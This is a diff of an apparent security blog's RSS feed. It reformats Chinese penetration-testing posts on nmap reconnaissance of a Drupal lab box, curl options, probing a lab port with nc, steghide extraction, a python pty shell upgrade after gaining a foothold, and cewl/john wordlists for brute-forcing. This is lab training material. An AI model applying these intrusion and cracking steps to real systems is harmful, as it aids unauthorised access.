-OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
-Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (88%)
-No exact OS matches for host (test conditions non-ideal).
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开放了 80、135、49154，详细信息扫描表明靶机跑在 Windows 下的 IIS 7.5上，运行的是 Drupal 7 服务，通过 ping 返回值为 ttl=127 确定为 Windows 操作系统，同时 80 端口暴露出了 includes、LICENSE.txt、robots.txt 等目录。&lt;/p&gt;</description></item><item><title>Curl 使用详解</title><link>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="curl-原理剖析"&gt;curl 原理剖析&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style="color:#ae81ff"&gt;10000&lt;/span&gt; -p- 10.129.6.171 -oA nmap/ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;[&lt;/span&gt;sudo&lt;span style="color:#f92672"&gt;]&lt;/span&gt; password &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; kali: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style="color:#f92672"&gt;(&lt;/span&gt; https://nmap.org &lt;span style="color:#f92672"&gt;)&lt;/span&gt; at 2025-12-28 08:11 EST
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap scan report &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; 10.129.6.171
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host is up &lt;span style="color:#f92672"&gt;(&lt;/span&gt;0.39s latency&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Not shown: &lt;span style="color:#ae81ff"&gt;65532&lt;/span&gt; filtered tcp ports &lt;span style="color:#f92672"&gt;(&lt;/span&gt;no-response&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PORT STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;80/tcp open http
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;135/tcp open msrpc
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;49154/tcp open unknown
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap &lt;span style="color:#66d9ef"&gt;done&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; IP address &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; host up&lt;span style="color:#f92672"&gt;)&lt;/span&gt; scanned in 15.57 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="nmap-详细信息扫描"&gt;nmap 详细信息扫描&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ sudo nmap -sT -sC -sV -O -p80,135,49154 10.129.6.171 -oA nmap/detail 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;[&lt;/span&gt;sudo&lt;span style="color:#f92672"&gt;]&lt;/span&gt; password &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; kali: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style="color:#f92672"&gt;(&lt;/span&gt; https://nmap.org &lt;span style="color:#f92672"&gt;)&lt;/span&gt; at 2025-12-28 08:12 EST
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap scan report &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; 10.129.6.171
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Host is up &lt;span style="color:#f92672"&gt;(&lt;/span&gt;0.22s latency&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PORT STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;80/tcp open http Microsoft IIS httpd 7.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_http-server-header: Microsoft-IIS/7.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_http-generator: Drupal &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;http://drupal.org&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| http-methods: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_ Potentially risky methods: TRACE
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| http-robots.txt: &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt; disallowed entries &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;15&lt;/span&gt; shown&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_/LICENSE.txt /MAINTAINERS.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;|_http-title: Welcome to Bastard | Bastard
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;135/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;49154/tcp open msrpc Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Warning: OSScan results may be unreliable because we could not find at least &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; open and &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; closed port
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Device type: general purpose|phone|specialized
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Running &lt;span style="color:#f92672"&gt;(&lt;/span&gt;JUST GUESSING&lt;span style="color:#f92672"&gt;)&lt;/span&gt;: Microsoft Windows 2008|7|Vista|2012|Phone|8.1 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;97%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Aggressive OS guesses: Microsoft Windows &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; or Windows Server &lt;span style="color:#ae81ff"&gt;2008&lt;/span&gt; R2 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;97%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Vista or Windows &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;92%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span style="color:#ae81ff"&gt;2012&lt;/span&gt; R2 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;91%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows 8.1 Update &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;90%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;90%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Embedded Standard &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;89%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span style="color:#ae81ff"&gt;2008&lt;/span&gt; R2 SP1 or Windows &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;89%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Vista SP0 or SP1, Windows Server &lt;span style="color:#ae81ff"&gt;2008&lt;/span&gt; SP1, or Windows &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;89%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span style="color:#ae81ff"&gt;2008&lt;/span&gt; R2 or Windows &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; SP1 &lt;span style="color:#f92672"&gt;(&lt;/span&gt;89%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;, Microsoft Windows Vista SP2, Windows &lt;span style="color:#ae81ff"&gt;7&lt;/span&gt; SP1, or Windows Server &lt;span style="color:#ae81ff"&gt;2008&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;88%&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;No exact OS matches &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; host &lt;span style="color:#f92672"&gt;(&lt;/span&gt;test conditions non-ideal&lt;span style="color:#f92672"&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Nmap &lt;span style="color:#66d9ef"&gt;done&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; IP address &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; host up&lt;span style="color:#f92672"&gt;)&lt;/span&gt; scanned in 76.10 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开放了 80、135、49154，详细信息扫描表明靶机跑在 Windows 下的 IIS 7.5上，运行的是 Drupal 7 服务，通过 ping 返回值为 ttl=127 确定为 Windows 操作系统，同时 80 端口暴露出了 includes、LICENSE.txt、robots.txt 等目录。&lt;/p&gt;</description></item><item><title>Curl 使用详解</title><link>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</link><pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="curl-原理剖析"&gt;curl 原理剖析&lt;/h2&gt;
 &lt;h3 id="curl-核心机制"&gt;curl 核心机制&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Libcurl 驱动：curl 是 libcurl 库的命令行前端，实际上 curl 的每一个参数都在映射 libcurl 的 curl_easy_setopt() 函数调用。&lt;/li&gt;
@@ -184,28 +184,28 @@ Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
 &lt;h2 id="curl-参数详解"&gt;curl 参数详解&lt;/h2&gt;
 &lt;h3 id="curl-帮助命令"&gt;curl 帮助命令&lt;/h3&gt;
 &lt;p&gt;下面为 curl 详细地帮助命令&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ curl -h 
-Usage: curl [options...] &amp;lt;url&amp;gt;
- -d, --data &amp;lt;data&amp;gt; HTTP POST data
- -f, --fail Fail fast with no output on HTTP errors
- -h, --help &amp;lt;subject&amp;gt; Get help for commands
- -o, --output &amp;lt;file&amp;gt; Write to file instead of stdout
- -O, --remote-name Write output to file named as remote file
- -i, --show-headers Show response headers in output
- -s, --silent Silent mode
- -T, --upload-file &amp;lt;file&amp;gt; Transfer local FILE to destination
- -u, --user &amp;lt;user:password&amp;gt; Server user and password
- -A, --user-agent &amp;lt;name&amp;gt; Send User-Agent &amp;lt;name&amp;gt; to server
- -v, --verbose Make the operation more talkative
- -V, --version Show version number and quit
-
-This is not the full help; this menu is split into categories.
-Use &amp;#34;--help category&amp;#34; to get an overview of all categories, which are:
-auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
-Use &amp;#34;--help all&amp;#34; to list all options
-Use &amp;#34;--help [option]&amp;#34; to view documentation for a given option
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="参数详解"&gt;参数详解&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ curl -h 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Usage: curl &lt;span style="color:#f92672"&gt;[&lt;/span&gt;options...&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &amp;lt;url&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -d, --data &amp;lt;data&amp;gt; HTTP POST data
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -f, --fail Fail fast with no output on HTTP errors
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -h, --help &amp;lt;subject&amp;gt; Get help &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; commands
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -o, --output &amp;lt;file&amp;gt; Write to file instead of stdout
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -O, --remote-name Write output to file named as remote file
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -i, --show-headers Show response headers in output
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -s, --silent Silent mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -T, --upload-file &amp;lt;file&amp;gt; Transfer local FILE to destination
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -u, --user &amp;lt;user:password&amp;gt; Server user and password
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -A, --user-agent &amp;lt;name&amp;gt; Send User-Agent &amp;lt;name&amp;gt; to server
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -v, --verbose Make the operation more talkative
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -V, --version Show version number and quit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;This is not the full help; this menu is split into categories.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Use &lt;span style="color:#e6db74"&gt;&amp;#34;--help category&amp;#34;&lt;/span&gt; to get an overview of all categories, which are:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Use &lt;span style="color:#e6db74"&gt;&amp;#34;--help all&amp;#34;&lt;/span&gt; to list all options
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Use &lt;span style="color:#e6db74"&gt;&amp;#34;--help [option]&amp;#34;&lt;/span&gt; to view documentation &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; a given option
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="参数详解"&gt;参数详解&lt;/h3&gt;
 &lt;h4 id="-ddata-data-参数"&gt;-d/&amp;ndash;data &amp;lt;data&amp;gt; 参数&lt;/h4&gt;
 &lt;p&gt;使用 -d 参数，curl 默认将 HTTP 方法切换为 POST，默认 Content-Type 被设置为 &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt; 。&lt;/p&gt;</description></item><item><title>渗透测试通用方法论</title><link>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</link><pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E8%AE%BA/</guid><description>&lt;blockquote&gt;
 &lt;p&gt;本文章持续更新中&lt;/p&gt;
@@ -213,41 +213,41 @@ Use &amp;#34;--help [option]&amp;#34; to view documentation for a given option
 &lt;h2 id="遇见的情况以及方法论"&gt;遇见的情况以及方法论&lt;/h2&gt;
 &lt;h3 id="开放的非常规端口"&gt;开放的非常规端口&lt;/h3&gt;
 &lt;p&gt;遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ nc -u 10.10.10.45 1440
-?
-
-Wrong Code!!
-We&amp;#39;ll notify Commander Tarkin of this offense
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用 echo 传输字符串并通过 nc 链接端口。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ echo &amp;#34;DS-1@OBS&amp;#34; | nc -u 10.10.10.45 1440
-......
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="图片分析"&gt;图片分析&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ nc -u 10.10.10.45 &lt;span style="color:#ae81ff"&gt;1440&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;?
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Wrong Code!!
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;We&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;ll notify Commander Tarkin of this offense
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用 echo 传输字符串并通过 nc 链接端口。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ echo &lt;span style="color:#e6db74"&gt;&amp;#34;DS-1@OBS&amp;#34;&lt;/span&gt; | nc -u 10.10.10.45 &lt;span style="color:#ae81ff"&gt;1440&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;......
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="图片分析"&gt;图片分析&lt;/h3&gt;
 &lt;p&gt;图片分析一般先查看隐写情况。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
-└─$ steghide extract -sf x.jpg
-Enter passphrase:
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &amp;ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;┌──&lt;span style="color:#f92672"&gt;(&lt;/span&gt;kali㉿kali&lt;span style="color:#f92672"&gt;)&lt;/span&gt;-&lt;span style="color:#f92672"&gt;[&lt;/span&gt;~/Work/Kali&lt;span style="color:#f92672"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;└─$ steghide extract -sf x.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Enter passphrase:
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解释一下这个命令，extract 为提取模式，提取图片中隐藏的内容，-sf 为 &amp;ndash;stegofile 的缩写，指定文件为 x.jpg。需要密码的话想到的、空密码、弱密码均值得尝试。&lt;/p&gt;
 &lt;h3 id="bash-逃逸"&gt;Bash 逃逸&lt;/h3&gt;
 &lt;p&gt;在获得初始立足点后常常 bash 的交互性并不完善，通常使用 python 的 pty 库获得一个假的、交互性相对好的 bash。&lt;/p&gt;
-&lt;pre tabindex="0"&gt;&lt;code&gt;python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行上面这个命令时，Python 调用 pty.spawn() 函数，创建一个伪终端（pseudo-terminal，简称 pty），并在该终端启动一个心得交互式 bash shell 进程。这个新的伪终端具有完整的交互能力，能够处理用户输入、输出以及终端控制信息（如回显密码提示）。一旦这个新的 shell 被创建就相当于处于一个真正的交互终端中。&lt;/p&gt;</description></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python3 -c &lt;span style="color:#e6db74"&gt;&amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;);&amp;#34;&lt;/span&gt;
